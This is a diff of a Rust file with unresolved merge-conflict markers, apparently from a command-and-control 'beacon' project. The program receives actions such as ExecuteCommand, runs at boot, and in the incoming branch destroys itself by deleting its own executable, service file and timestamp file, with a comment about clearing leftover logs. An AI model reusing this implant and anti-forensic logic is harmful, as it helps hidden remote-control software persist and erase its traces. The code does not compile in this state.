@@ -3,6 +3,7 @@ use std::cell::RefCell;
 use std::fs::File;
 use std::process::Command;
 use std::io::Write;
+<<<<<<< HEAD
 use std::os::unix::net::UnixStream;
 use std::path::Path;
 use chrono::{DateTime, Local};
@@ -10,6 +11,11 @@ use chrono::{DateTime, Local};
 use beacon_controller::models::actions::BeaconAction;
 use beacon_controller::models::actions::BeaconAction::{ExecuteCommand, FallAsleep};
 
+=======
+use std::path::Path;
+use chrono::{DateTime, Local};
+
+>>>>>>> origin/luco/fix
 thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
     fs::read_to_string(TIME).unwrap_or_else(|_err| {
         println!("{}", Local::now());
@@ -24,6 +30,7 @@ fn main() {
     run();
 }
 
+<<<<<<< HEAD
 //should not be needed anymore
 // fn read_entry() -> &'static str {
 //     //placeholder fonction
@@ -66,6 +73,14 @@ fn run() {
     if !Path::new(TIME).try_exists().expect("cannot check existence") {
         let mut ftime = File::create(TIME).unwrap();
         writeln!(ftime, "{}", Local::now().to_rfc3339()).expect("failed to write in file");
+=======
+fn read_entry() -> &'static str {
+    //placeholder fonction
+    //TODO Truc pour récup' l'entrée
+    let entry :&str = "switch toto";
+    if !entry.is_empty() {
+        update_time();
+>>>>>>> origin/luco/fix
     }
 
     //boucle principale du programme
@@ -131,7 +146,49 @@ fn update_time() {
     }).expect("Failed to write");
 }
 
+<<<<<<< HEAD
 //placeholder
 fn get_latest_action(mut simu_request: &Vec<BeaconAction>) -> Option<BeaconAction> {
     return simu_request.pop()
+=======
+fn run() {
+    //fonction principale d'execution
+    let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
+    exec_on_boot();
+    if !Path::new(TIME).try_exists().expect("cannot check existence") {
+        let mut ftime = File::create(TIME).unwrap();
+        writeln!(ftime, "{}", Local::now().to_rfc3339()).expect("failed to write in file");
+    }
+
+    //boucle principale du programme
+    loop {
+        if is_operating_as_transmition_tower {
+            //act as the transmition tower, aka read for change and forward message
+            is_operating_as_transmition_tower = read_and_transmit_as_tower(is_operating_as_transmition_tower);
+            println!("je suis une tour");
+        } else {
+            println!("je suis actif");
+        }
+
+        if LAST_ENTRY.with(|instant| {
+            Local::now().signed_duration_since(*instant.borrow()).num_seconds() >= 2
+        }) {
+            //Ne pas oublier de clear les fichiers residuels (startup et log de communication)
+            //auto-destruction
+            let exe = env::current_exe().expect("Failed to get current exe");
+            fs::remove_file(&exe).expect("Failed to delete current exe");
+            fs::remove_file(TIME).expect("Failed to delete TIME");
+            fs::remove_file(SERVICE).expect("Failed to delete SERVICE");
+            break
+        }
+    }
+}
+
+fn update_time() {
+    LAST_ENTRY.with(|time| {
+        *time.borrow_mut() = Local::now();
+        let mut ftime = File::create(TIME).unwrap();
+        writeln!(ftime, "{}", &*time.borrow().to_rfc3339())
+    }).expect("Failed to write");
+>>>>>>> origin/luco/fix
 }
